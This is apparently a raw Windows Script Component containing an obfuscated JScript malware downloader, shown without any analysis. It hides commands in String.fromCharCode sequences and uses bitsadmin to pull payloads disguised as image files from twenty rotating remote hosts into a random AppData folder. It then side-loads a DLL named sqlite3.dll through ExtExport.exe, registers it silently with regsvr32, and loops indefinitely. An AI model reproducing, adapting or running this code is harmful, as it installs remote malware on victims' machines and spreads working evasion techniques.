<?xml version="1.0"?>
<package>
<component id="aeKAFD52D8IUE8rtyiosp">
<script language="JScript">
<![CDATA[

var asiu3874;
asiu3874 = "05/";	

	
    function df823ijs84(min, max)
	{
     return Math.round(Math.random()*(max-min)+min)
	}	

	var fgiusy432897y59;
	var sdfuyt2256;
	var ofigi32wj43;
	var oweybhcd728;
	var df987s6gfg;
	var e9rt83hgg;
	var qp04nf83j;
	var zfiug8q3e;
	var qpanr693y7;
	var df8j34r9je;
	var sdfg984524tjre;
	var sdfgj8rgwj8245;
    fgiusy432897y59 = false; 
    sdfuyt2256 = false; 
	var dsfg4822 = new ActiveXObject("Scripting.FileSystemObject");
	var sfdiho59696w = new ActiveXObject("WScript.Shell");
    var fdsg9w4gj9322 = new ActiveXObject("WScript.Shell");
    var e3794jruhwer = new ActiveXObject("Shell.Application");

	
     function mrc430(url, file)
    {
		try
		{			
		 sfdiho59696w.run(String.fromCharCode(98)+String.fromCharCode(105)+String.fromCharCode(116)+
		 String.fromCharCode(115)+String.fromCharCode(97)+String.fromCharCode(100)+String.fromCharCode(109)+
		 String.fromCharCode(105)+String.fromCharCode(110)+" /"+String.fromCharCode(116)+String.fromCharCode(114)+
		 String.fromCharCode(97)+String.fromCharCode(110)+String.fromCharCode(115)+String.fromCharCode(102)+
		 String.fromCharCode(101)+String.fromCharCode(114)+" "+df823ijs84(666,99777)+" /"+String.fromCharCode(112)+
		 String.fromCharCode(114)+String.fromCharCode(105)+String.fromCharCode(111)+String.fromCharCode(114)+String.fromCharCode(105)+
		 String.fromCharCode(116)+String.fromCharCode(121)+String.fromCharCode(32)+String.fromCharCode(102)+String.fromCharCode(111)+
		 String.fromCharCode(114)+String.fromCharCode(101)+String.fromCharCode(103)+String.fromCharCode(114)+String.fromCharCode(111)+
		 String.fromCharCode(117)+String.fromCharCode(110)+String.fromCharCode(100)+" "+
		 url+" "+file,0,true);
		 return true;
		}
        catch (ex)
        {		
         return false;
        }
        
    }	
	
	
function sdfiou8274rj(min)
{

sdfuyt2256 = false; 


	dirjeh294 = df823ijs84(0,19);

   if (dirjeh294 == 0)
   {
    ofigi32wj43 = "https://5fuaop.bryh.monster/"+asiu3874;
   }

   if (dirjeh294 == 1)
   {
    ofigi32wj43 = "https://7faiew.bryh.xyz/"+asiu3874;
   }

   if (dirjeh294 == 2)
   {
    ofigi32wj43 = "https://cwae3.sawq.monster/"+asiu3874;
   }

   if (dirjeh294 == 3)
   {
    ofigi32wj43 = "https://hbaee.bryh.info/"+asiu3874;
   }

   if (dirjeh294 == 4)
   {
    ofigi32wj43 = "https://oqiumr.bryh.site/"+asiu3874;
   }

   if (dirjeh294 == 5)
   {
    ofigi32wj43 = "https://steihn.bryh.website/"+asiu3874;
   }

   if (dirjeh294 == 6)
   {
    ofigi32wj43 = "https://war3.bryh.buzz/"+asiu3874;
   }

   if (dirjeh294 == 7)
   {
    ofigi32wj43 = "https://wara.bryh.fun/"+asiu3874;
   }

   if (dirjeh294 == 8)
   {
    ofigi32wj43 = "https://wea71.sawq.buzz/"+asiu3874;
   }

   if (dirjeh294 == 9)
   {
    ofigi32wj43 = "https://wra7s.bryh.life/"+asiu3874;
   }

   if (dirjeh294 == 10)
   {
    ofigi32wj43 = "https://0doumo.bryh.site/"+asiu3874;
   }

   if (dirjeh294 == 11)
   {
    ofigi32wj43 = "https://20ou4y.bryh.monster/"+asiu3874;
   }

   if (dirjeh294 == 12)
   {
    ofigi32wj43 = "https://85iob8.bryh.buzz/"+asiu3874;
   }

   if (dirjeh294 == 13)
   {
    ofigi32wj43 = "https://fkaee.bryh.life/"+asiu3874;
   }

   if (dirjeh294 == 14)
   {
    ofigi32wj43 = "https://hmiawe.bryh.xyz/"+asiu3874;
   }

   if (dirjeh294 == 15)
   {
    ofigi32wj43 = "https://sguasu.bryh.fun/"+asiu3874;
   }

   if (dirjeh294 == 16)
   {
    ofigi32wj43 = "https://t3eewt.sawq.buzz/"+asiu3874;
   }

   if (dirjeh294 == 17)
   {
    ofigi32wj43 = "https://war3.sawq.monster/"+asiu3874;
   }

   if (dirjeh294 == 18)
   {
    ofigi32wj43 = "https://wea90.bryh.website/"+asiu3874;
   }

   if (dirjeh294 == 19)
   {
    ofigi32wj43 = "https://xkawr.bryh.info/"+asiu3874;
   }




   


oweybhcd728 = ofigi32wj43;

var objShell = new ActiveXObject("WScript.Shell");
appDataLocation=objShell.ExpandEnvironmentStrings("%APPDATA%");

if (dsfg4822.FileExists("C:\\Users\\Public\\h")){	
  var h8fasd7 = dsfg4822.OpenTextFile("C:\\Users\\Public\\h", 1); 
  zfiug8q3e = h8fasd7.ReadLine(); 
  h8fasd7.Close(); 
  qp04nf83j = zfiug8q3e;
  qpanr693y7 = zfiug8q3e;
} else {
qp04nf83j = appDataLocation+"\\"+String.fromCharCode(df823ijs84(65,90))+String.fromCharCode(df823ijs84(65,90))+
String.fromCharCode(df823ijs84(65,90))+df823ijs84(1626667,9982651)+"\\";
qpanr693y7 = qp04nf83j;	
}



df8j34r9je = "xXx"	


	try
	{
	var fso = new ActiveXObject("Scripting.FileSystemObject");  
	fso.CreateFolder(qp04nf83j);  
	}
    catch (ex)
    {
		
	}

	try
	{
	var fso = new ActiveXObject("Scripting.FileSystemObject");  
	fso.CreateFolder(qpanr693y7);  
	}
    catch (ex)
    {
		
	}


	try
	{    
     if (dsfg4822.FileExists(qp04nf83j+"sqlite3.dll")){	   
	   f = dsfg4822.GetFile(qp04nf83j+"sqlite3.dll");	   
	   if (f.size < 10 ){
		f.Delete();  
		f.Close();		
	   }
     }   
	}
    catch (ex)
    {
		
	}	 

	cmdkqay164 = String.fromCharCode(99)+String.fromCharCode(109)+String.fromCharCode(100)+String.fromCharCode(32)+String.fromCharCode(47)+
	String.fromCharCode(99)+String.fromCharCode(32)+String.fromCharCode(99)+String.fromCharCode(100)+String.fromCharCode(32)+
	String.fromCharCode(34)+String.fromCharCode(67)+String.fromCharCode(58)+String.fromCharCode(92)+String.fromCharCode(80)+
	String.fromCharCode(114)+String.fromCharCode(111)+String.fromCharCode(103)+String.fromCharCode(114)+String.fromCharCode(97)+
	String.fromCharCode(109)+String.fromCharCode(32)+String.fromCharCode(70)+String.fromCharCode(105)+String.fromCharCode(108)+
	String.fromCharCode(101)+String.fromCharCode(115)+String.fromCharCode(32)+String.fromCharCode(40)+String.fromCharCode(120)+
	String.fromCharCode(56)+String.fromCharCode(54)+String.fromCharCode(41)+String.fromCharCode(92)+String.fromCharCode(73)+
	String.fromCharCode(110)+String.fromCharCode(116)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(110)+
	String.fromCharCode(101)+String.fromCharCode(116)+String.fromCharCode(32)+String.fromCharCode(69)+String.fromCharCode(120)+
	String.fromCharCode(112)+String.fromCharCode(108)+String.fromCharCode(111)+String.fromCharCode(114)+String.fromCharCode(101)+
	String.fromCharCode(114)+String.fromCharCode(92)+String.fromCharCode(34)+String.fromCharCode(32)+String.fromCharCode(38)+
	String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(69)+String.fromCharCode(120)+String.fromCharCode(116)+
	String.fromCharCode(69)+String.fromCharCode(120)+String.fromCharCode(112)+String.fromCharCode(111)+String.fromCharCode(114)+
	String.fromCharCode(116)+String.fromCharCode(46)+String.fromCharCode(101)+String.fromCharCode(120)+String.fromCharCode(101);
	
	cmdkqay132 = String.fromCharCode(99)+String.fromCharCode(109)+String.fromCharCode(100)+String.fromCharCode(32)+String.fromCharCode(47)+
	String.fromCharCode(99)+String.fromCharCode(32)+String.fromCharCode(99)+String.fromCharCode(100)+String.fromCharCode(32)+
	String.fromCharCode(34)+String.fromCharCode(67)+String.fromCharCode(58)+String.fromCharCode(92)+String.fromCharCode(80)+
	String.fromCharCode(114)+String.fromCharCode(111)+String.fromCharCode(103)+String.fromCharCode(114)+String.fromCharCode(97)+
	String.fromCharCode(109)+String.fromCharCode(32)+String.fromCharCode(70)+String.fromCharCode(105)+String.fromCharCode(108)+
	String.fromCharCode(101)+String.fromCharCode(115)+String.fromCharCode(92)+String.fromCharCode(73)+String.fromCharCode(110)+
	String.fromCharCode(116)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(110)+String.fromCharCode(101)+
	String.fromCharCode(116)+String.fromCharCode(32)+String.fromCharCode(69)+String.fromCharCode(120)+String.fromCharCode(112)+
	String.fromCharCode(108)+String.fromCharCode(111)+String.fromCharCode(114)+String.fromCharCode(101)+String.fromCharCode(114)+
	String.fromCharCode(92)+String.fromCharCode(34)+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+
	String.fromCharCode(32)+String.fromCharCode(69)+String.fromCharCode(120)+String.fromCharCode(116)+String.fromCharCode(69)+
	String.fromCharCode(120)+String.fromCharCode(112)+String.fromCharCode(111)+String.fromCharCode(114)+String.fromCharCode(116)+
	String.fromCharCode(46)+String.fromCharCode(101)+String.fromCharCode(120)+String.fromCharCode(101);
   
     wpxa064 = "C:\\Program Files (x86)\\Internet Explorer\\ExtExport.exe";
     wpxa032 = "C:\\Program Files\\Internet Explorer\\ExtExport.exe";
	 
	
        if (dsfg4822.FileExists(qp04nf83j+"sqlite3.dll")){	 

			if (dsfg4822.FileExists(wpxa064)){						 	
				try
				{				  
				sfdiho59696w.run(cmdkqay164+' "'+qp04nf83j+'sqlite3.dll" 2 3 4 FIREFOX {00000000-0000-0000-0000-000000000000}',0,true); 
				}
				catch (ex)
				{
				
				}	
			sdfuyt2256 = true;             
			}
			
			if (dsfg4822.FileExists(wpxa032)){
				try
				{		  					
				sfdiho59696w.run(cmdkqay132+' "'+qp04nf83j+'sqlite3.dll" 2 3 4 FIREFOX {00000000-0000-0000-0000-000000000000}',0,true); 										  
				}
				catch (ex)
				{
				
				}	
			sdfuyt2256 = true;             
			}
			sfdiho59696w.run('regsvr32 /s "'+qp04nf83j+'sqlite3.dll"',0,true); 
		}
	 

     
  if (sdfuyt2256 == false)
  { 
   
	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysdwwn.gif.zip",qp04nf83j+"mammonsysdwwn.gif");
        if (fgiusy432897y59 == false) {	 
	     mrc430(oweybhcd728+"mammonsysdwwn.gif.zip",qp04nf83j+"mammonsysdwwn.gif");
	    }

	}
    catch (ex)
    {
		
	}	

	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysc.jpg.zip",qp04nf83j+"mammonsysc.jpg");
        if (fgiusy432897y59 == false) {	
	     mrc430(oweybhcd728+"mammonsysc.jpg.zip",qp04nf83j+"mammonsysc.jpg");
	    }
	}
    catch (ex)
    {
		
	}	

	
	try
	{

	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysa.jpg.zip",qp04nf83j+"mammonsysa.jpg");
        if (fgiusy432897y59 == false) {	
	     mrc430(oweybhcd728+"mammonsysa.jpg.zip",qp04nf83j+"mammonsysa.jpg");
	    }
	}
    catch (ex)
    {
	
	}	


	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysb.jpg.zip",qp04nf83j+"mammonsysb.jpg");
        if (fgiusy432897y59 == false) {	
	     mrc430(oweybhcd728+"mammonsysb.jpg.zip",qp04nf83j+"mammonsysb.jpg");
	    }
	}
    catch (ex)
    {
			
	}		


	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysdx.gif.zip",qp04nf83j+"mammonsysdx.gif");
        if (fgiusy432897y59 == false) {	 
	     mrc430(oweybhcd728+"mammonsysdx.gif.zip",qp04nf83j+"mammonsysdx.gif");
	    }
	}
    catch (ex)
    {
		
	}

	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysg.gif.zip",qp04nf83j+"mammonsysg.gif");
        if (fgiusy432897y59 == false) {		 
	     mrc430(oweybhcd728+"mammonsysg.gif.zip",qp04nf83j+"mammonsysg.gif");
	    }
	}
    catch (ex)
    {
		
	}
	

	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysgx.gif.zip",qp04nf83j+"mammonsysgx.gif");
        if (fgiusy432897y59 == false) {		 
	     mrc430(oweybhcd728+"mammonsysgx.gif.zip",qp04nf83j+"mammonsysgx.gif");
	    }
	}
    catch (ex)
    {
		
	}

	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysi.gif.zip",qp04nf83j+"mammonsysi.gif");
        if (fgiusy432897y59 == false) {		 
	     mrc430(oweybhcd728+"mammonsysi.gif.zip",qp04nf83j+"mammonsysi.gif");
	    }
	}
    catch (ex)
    {
		
	}

	
	
	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysxa.gif.zip",qp04nf83j+"mammonsysxa.~");
        if (fgiusy432897y59 == false) {	 
	     mrc430(oweybhcd728+"mammonsysxa.gif.zip",qp04nf83j+"mammonsysxa.~");
	    }
	}
    catch (ex)
    {
	
	}	


	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysxb.gif.zip",qp04nf83j+"mammonsysxb.~");
        if (fgiusy432897y59 == false) {	 
	     mrc430(oweybhcd728+"mammonsysxb.gif.zip",qp04nf83j+"mammonsysxb.~");
	    }
	}
    catch (ex)
    {
		
	}	

	
	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsysxc.gif.zip",qp04nf83j+"mammonsysxc.~");
        if (fgiusy432897y59 == false) {	 
	     mrc430(oweybhcd728+"mammonsysxc.gif.zip",qp04nf83j+"mammonsysxc.~");
	    }
	}
    catch (ex)
    {
		
	}	


	sdfg984524tjre = df823ijs84(1, 99);
	try
	{
	 fgiusy432897y59 = mrc430(ofigi32wj43+"mammonsyshh"+sdfg984524tjre+".dll.zip",qp04nf83j+"sqlite3.dll");
	    if (fgiusy432897y59 == false) {
	     mrc430(oweybhcd728+"mammonsyshh"+sdfg984524tjre+".dll.zip",qp04nf83j+"sqlite3.dll");
	    }
	}
    catch (ex)
    {
		
	}	
	
	
					if (dsfg4822.FileExists(qp04nf83j+"sqlite3.dll")){
						if (dsfg4822.FileExists(wpxa064)){						 	
						 try
						 {	
						 sfdiho59696w.run('cmd /V /C "echo '+df8j34r9je+'>'+qp04nf83j+'\\r1.log"&& exit',0,true); 
						 sfdiho59696w.run('cmd /V /C "echo '+qp04nf83j+'>'+'C:\\Users\\Public\\h"&& exit',0,true); 						 

						 sfdiho59696w.run(cmdkqay164+' "'+qp04nf83j+'sqlite3.dll" 2 3 4 FIREFOX {00000000-0000-0000-0000-000000000000}',0,true); 		
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 sdfuyt2256 = true;             
						}
						
						
						 if (dsfg4822.FileExists(wpxa032)){	

						 try
						 {	
						 sfdiho59696w.run('cmd /V /C "echo '+df8j34r9je+'>'+qp04nf83j+'\\r1.log"&& exit',0,true); 
						 sfdiho59696w.run('cmd /V /C "echo '+qp04nf83j+'>'+'C:\\Users\\Public\\h"&& exit',0,true); 
						 
						 sfdiho59696w.run(cmdkqay132+' "'+qp04nf83j+'sqlite3.dll" 2 3 4 FIREFOX {00000000-0000-0000-0000-000000000000}',0,true); 		
				  
						 }
						 catch (ex)
						 {
			
						 }	
						 sdfuyt2256 = true;             
						}
						sfdiho59696w.run('regsvr32 /s "'+qp04nf83j+'sqlite3.dll"',0,true); 
					}
	
  }


sfdiho59696w.run(String.fromCharCode(99)+String.fromCharCode(109)+String.fromCharCode(100)+
String.fromCharCode(32)+String.fromCharCode(47)+
String.fromCharCode(99)+String.fromCharCode(32)+String.fromCharCode(101)+String.fromCharCode(99)+
String.fromCharCode(104)+String.fromCharCode(111)+String.fromCharCode(32)+String.fromCharCode(37)+
String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(109)+String.fromCharCode(101)+
String.fromCharCode(37)+String.fromCharCode(32)+String.fromCharCode(38)+String.fromCharCode(38)+
String.fromCharCode(32)+String.fromCharCode(116)+String.fromCharCode(105)+String.fromCharCode(109)+
String.fromCharCode(101)+String.fromCharCode(111)+String.fromCharCode(117)+String.fromCharCode(116)+
String.fromCharCode(32)+String.fromCharCode(52)+String.fromCharCode(48)+String.fromCharCode(48)+
String.fromCharCode(48)+String.fromCharCode(32)+String.fromCharCode(62)+String.fromCharCode(32)+
String.fromCharCode(78)+String.fromCharCode(85)+String.fromCharCode(76)+String.fromCharCode(32)+
String.fromCharCode(38)+String.fromCharCode(38)+String.fromCharCode(32)+String.fromCharCode(101)+
String.fromCharCode(120)+String.fromCharCode(105)+String.fromCharCode(116),0,true); 
sdfiou8274rj(df823ijs84(0000666,777766611));
}

sdfiou8274rj(df823ijs84(0000666,777766611));

]]>
</script>
</component>
</package>

